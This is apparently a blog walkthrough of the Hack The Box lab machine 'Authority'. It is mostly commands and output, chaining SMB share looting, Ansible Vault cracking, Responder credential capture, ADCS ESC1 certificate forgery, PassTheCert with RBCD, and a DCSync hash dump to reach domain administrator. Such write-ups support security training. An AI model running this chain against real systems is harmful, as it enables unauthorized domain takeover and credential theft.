---
title: "HTB Authority"
date: 2026-05-14 04:01 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Medium, ADCS]
image: /assets/img/posts/authority/authority.png
---
**HTB Authority** is a Windows `Active Directory` machine that starts with unauthenticated `SMB` enumeration, recovers credentials from `Ansible Vault` files on a readable share, captures cleartext `LDAP` credentials via `Responder` by abusing a misconfigured `PWM` instance, and escalates to `Domain Administrator` through an `ADCS ESC1` vulnerability by adding a fake computer account, forging a certificate for the Administrator, and leveraging `PassTheCert` with `RBCD` to perform a `DCSync` attack.
## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.32.254 -nv --min-rate 1000
```
```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
8443/tcp  open  https-alt
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49673/tcp open  unknown
49690/tcp open  unknown
49691/tcp open  unknown
49694/tcp open  unknown
49696/tcp open  unknown
49702/tcp open  unknown
49715/tcp open  unknown
58885/tcp open  unknown
```
- NSE Scripts & Version
```
nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49673,49690,49691,49694,49696,49702,49715,58885 10.129.32.254 -nv --min-rate 1000
```
```
53/tcp    open  domain        Simple DNS Plus                                                                                                                
80/tcp    open  http          Microsoft IIS httpd 10.0                                                                                                       
|_http-title: IIS Windows Server                                                                                                                             
| http-methods:                                                                                                                                              
|   Supported Methods: OPTIONS TRACE GET HEAD POST                                                                                                           
|_  Potentially risky methods: TRACE                                                                                                                         
|_http-server-header: Microsoft-IIS/10.0                                                                                                                     
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-14 19:06:18Z)                                                                 
135/tcp   open  msrpc         Microsoft Windows RPC                                                                                                          
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                                                  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)                                 
| ssl-cert: Subject:                                                                                                                                         
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB                                                
| Issuer: commonName=htb-AUTHORITY-CA                                                                                                                        
| Public Key type: rsa                                                                                                                                       
| Public Key bits: 2048                                                                                                                                      
| Signature Algorithm: sha256WithRSAEncryption                                                                                                               
| Not valid before: 2022-08-09T23:03:21                                                                                                                      
| Not valid after:  2024-08-09T23:13:21                                                                                                                      
| MD5:     d494 7710 6f6b 8100 e4e1 9cf2 aa40 dae1                                                                                                           
| SHA-1:   dded b994 b80c 83a9 db0b e7d3 5853 ff8e 54c6 2d0b                                                                                                 
|_SHA-256: e1d2 e894 2960 a961 bbf7 b4e4 c110 c6d7 e5a1 7a29 8987 85dc 3553 fb90 458a 5cb7
|_ssl-date: 2026-05-14T19:07:49+00:00; +4h00m07s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldapssl?
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:     d494 7710 6f6b 8100 e4e1 9cf2 aa40 dae1
| SHA-1:   dded b994 b80c 83a9 db0b e7d3 5853 ff8e 54c6 2d0b
|_SHA-256: e1d2 e894 2960 a961 bbf7 b4e4 c110 c6d7 e5a1 7a29 8987 85dc 3553 fb90 458a 5cb7
|_ssl-date: 2026-05-14T19:07:49+00:00; +4h00m06s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21
| MD5:     d494 7710 6f6b 8100 e4e1 9cf2 aa40 dae1
| SHA-1:   dded b994 b80c 83a9 db0b e7d3 5853 ff8e 54c6 2d0b
|_SHA-256: e1d2 e894 2960 a961 bbf7 b4e4 c110 c6d7 e5a1 7a29 8987 85dc 3553 fb90 458a 5cb7
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-05-14T19:07:49+00:00; +4h00m06s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: othername: UPN:AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB
| Issuer: commonName=htb-AUTHORITY-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-09T23:03:21
| Not valid after:  2024-08-09T23:13:21                                                                                                        11:07 [30/238]
| MD5:     d494 7710 6f6b 8100 e4e1 9cf2 aa40 dae1
| SHA-1:   dded b994 b80c 83a9 db0b e7d3 5853 ff8e 54c6 2d0b
|_SHA-256: e1d2 e894 2960 a961 bbf7 b4e4 c110 c6d7 e5a1 7a29 8987 85dc 3553 fb90 458a 5cb7
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
|_http-trane-info: Problem with XML parsing of /evox/about
| tls-alpn: 
|_  h2
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: F588322AAF157D82BB030AF1EFFD8CF9
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=172.16.2.118
| Issuer: commonName=172.16.2.118
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-12T18:54:23
| Not valid after:  2028-05-14T06:32:47
| MD5:     3e2b 9d91 ce0a 7091 4fc4 5e0b 68fc a631
| SHA-1:   c569 41f0 9d6b 24e8 e954 ede9 732d e5b4 027a b15a
|_SHA-256: 40cf 358c 564d 72ef d8e2 d5b6 88fa 7f4e 99e3 8462 b2ec 84f2 9abc fd40 2f67 c057
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49690/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
58885/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time: 
|   date: 2026-05-14T19:07:33
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 4h00m06s, deviation: 0s, median: 4h00m05s
```
### Configuration
- /etc/hosts
```
sudo nxc smb 10.129.32.254 --generate-hosts-file /etc/hosts
```
- /etc/krb5.conf
```
sudo nxc smb AUTHORITY.authority.htb --generate-krb5-file /etc/krb5.conf
```
- time
```
sudo ntpdate -u AUTHORITY.authority.htb
```
## SHARE
### Guest Account
```
nxc smb AUTHORITY.authority.htb -u 'guest' -p '' --shares
SMB         10.129.32.254   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.254   445    AUTHORITY        [+] authority.htb\guest: 
SMB         10.129.32.254   445    AUTHORITY        [*] Enumerated shares
SMB         10.129.32.254   445    AUTHORITY        Share           Permissions     Remark
SMB         10.129.32.254   445    AUTHORITY        -----           -----------     ------
SMB         10.129.32.254   445    AUTHORITY        ADMIN$                          Remote Admin
SMB         10.129.32.254   445    AUTHORITY        C$                              Default share
SMB         10.129.32.254   445    AUTHORITY        Department Shares                 
SMB         10.129.32.254   445    AUTHORITY        Development     READ            
SMB         10.129.32.254   445    AUTHORITY        IPC$            READ            Remote IPC
SMB         10.129.32.254   445    AUTHORITY        NETLOGON                        Logon server share 
SMB         10.129.32.254   445    AUTHORITY        SYSVOL                          Logon server share
```
### RECURSE on
```
smbclient //10.129.32.254/Development -U 'AUTHORITY\\guest'
smb: \> RECURSE on
smb: \> prompt
smb: \> mget *
```
![ansible](/assets/img/posts/authority/ansible.png)
### Ansible
```
ansible2john ldap_admin_password pwm_admin_login pwm_admin_password > hashes.txt
```
```
hashcat -a 0 --user hash.txt rockyou.txt -d 1 -O
...
$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*
$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8:!@#$%^&*
$ansible$0*0*c08105402f5db77195a13c1087af3e6fb2bdae60473056b5a477731f51502f93*dfd9eec07341bac0e13c62fe1d0a5f7d*d04b50b49aa665c4db73ad5d8804b4b2511c3b15814ebcf2fe98334284203635:!@#$%^&*
```
```
!@#$%^&*
```
```
sudo apt update && sudo apt install -y ansible
ansible-vault decrypt pwm_admin_login
```
```
svc_pwm:pWm_@dm!N_!23
??(ldap):DevT3st@123
```
### PWM
```
➜  Authority nxc smb AUTHORITY.authority.htb -u 'svc_pwm' -p 'pWm_@dm!N_!23' --shares
SMB         10.129.32.254   445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.32.254   445    AUTHORITY        [+] authority.htb\svc_pwm:pWm_@dm!N_!23 (Guest)
SMB         10.129.32.254   445    AUTHORITY        [-] Error enumerating shares: STATUS_ACCESS_DENIED
```
`https://authority.htb:8443/`
![ldap_pwm](/assets/img/posts/authority/ldap_pwm.png)
```
sudo responder -I tun0 -wF -v
```
![responder](/assets/img/posts/authority/responder.png)
## svc_ldap
### evil-winrm
```
[LDAP] Cleartext Client   : 10.129.32.254
[LDAP] Cleartext Username : CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
[LDAP] Cleartext Password : lDaP_1n_th3_cle4r!
```
```
➜  Authority nxc ldap AUTHORITY.authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
LDAP        10.129.32.254   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.32.254   389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
```
```
➜  Authority nxc winrm AUTHORITY.authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'                                      
WINRM       10.129.32.254   5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) 
WINRM       10.129.32.254   5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
```
```
evil-winrm -i AUTHORITY.authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
```
### rusthound
```
rusthound-ce --domain authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' --ldaps --ldapip 10.129.32.254 --ldapport 636 -z
```
![responder](/assets/img/posts/authority/blood.png)
## ADCS
### ESC1

```
certipy-ad find -target AUTHORITY.authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -vulnerable -stdout
```
```
Certificate Authorities                                                                                                                         16:17 [42/67]
  0                                                                                                                                                          
    CA Name                             : AUTHORITY-CA                                                                                                       
    DNS Name                            : authority.authority.htb                                                                                            
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb                                                                              
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4                                                                                   
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00                                                                                          
    Certificate Validity End            : 2123-04-24 01:56:25+00:00                                                                                          
    Web Enrollment                                                                                                                                           
      HTTP                                                                                                                                                   
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
...
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2023-03-24T23:48:09+00:00
    Template Last Modified              : 2023-03-24T23:48:11+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Full Control Principals         : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Write Property Enroll           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
    [+] User Enrollable Principals      : AUTHORITY.HTB\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
```
➜  Authority nxc ldap AUTHORITY.authority.htb -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' -M maq
LDAP        10.129.32.254   389    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb) (signing:Enforced) (channel binding:Never)
LDAP        10.129.32.254   389    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
MAQ         10.129.32.254   389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.129.32.254   389    AUTHORITY        MachineAccountQuota: 10
```
```
impacket-addcomputer -computer-name 'FAKEONE$' -computer-pass 'P@ssword2023!' -dc-host "AUTHORITY.authority.htb" -domain-netbios "authority.htb" "authority.htb"/"svc_ldap":'lDaP_1n_th3_cle4r!'
```
```
certipy-ad req -username 'FAKEONE$' -password 'P@ssword2023!' -ca AUTHORITY-CA -dc-ip 10.129.32.254 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
```
- Auth [Fail]

```
certipy-ad auth -pfx administrator_authority.pfx -username administrator -domain authority.htb -dc-ip 10.129.32.254

[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```
### PassTheCert
```
certipy-ad cert -pfx administrator_authority.pfx -nocert -out administrator.key
```
```
certipy-ad cert -pfx administrator_authority.pfx -nokey -out administrator.crt
```
- [PassTheCert](https://github.com/AlmondOffSec/PassTheCert)

```
python PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.32.254
```
### RBCD
```
python PassTheCert/Python/passthecert.py -action write_rbcd -delegate-to 'AUTHORITY$' -delegate-from 'FAKEONE$' -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.129.32.254
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKEONE$ can now impersonate users on AUTHORITY$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FAKEONE$     (S-1-5-21-622327497-3269355298-2248959698-12102)
```
- Silver Ticket

```
impacket-getST -spn 'cifs/AUTHORITY.AUTHORITY.HTB' -impersonate Administrator 'authority.htb/FAKEONE$:P@ssword2023!'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_AUTHORITY.AUTHORITY.HTB@AUTHORITY.HTB.ccache
```
### Secretsdump
```
impacket-secretsdump -k -no-pass -just-dc AUTHORITY.authority.htb -dc-ip 10.129.32.254
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:1cf726d3b5395ceb24527d8917099700:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72c97be1f2c57ba5a51af2ef187969af4cf23b61b6dc444f93dd9cd1d5502a81
Administrator:aes128-cts-hmac-sha1-96:b5fb2fa35f3291a1477ca5728325029f
Administrator:des-cbc-md5:8ad3d50efed66b16
krbtgt:aes256-cts-hmac-sha1-96:1be737545ac8663be33d970cbd7bebba2ecfc5fa4fdfef3d136f148f90bd67cb
krbtgt:aes128-cts-hmac-sha1-96:d2acc08a1029f6685f5a92329c9f3161
krbtgt:des-cbc-md5:a1457c268ca11919
svc_ldap:aes256-cts-hmac-sha1-96:3773526dd267f73ee80d3df0af96202544bd2593459fdccb4452eee7c70f3b8a
svc_ldap:aes128-cts-hmac-sha1-96:08da69b159e5209b9635961c6c587a96
svc_ldap:des-cbc-md5:01a8984920866862
AUTHORITY$:aes256-cts-hmac-sha1-96:8107260e76fd9ccd330b121698ef713a65cbb8f012a378d60d1de1d78ccb3c1f
AUTHORITY$:aes128-cts-hmac-sha1-96:5b56a6b556867ba40959e8af7f696271
AUTHORITY$:des-cbc-md5:f2ce40efa23d32cb
[*] Cleaning up...
```
### Shell as Administrator
```
evil-winrm -i AUTHORITY.authority.htb -u 'Administrator' -H '6961f422924da90a6928197429eea4ed'
```
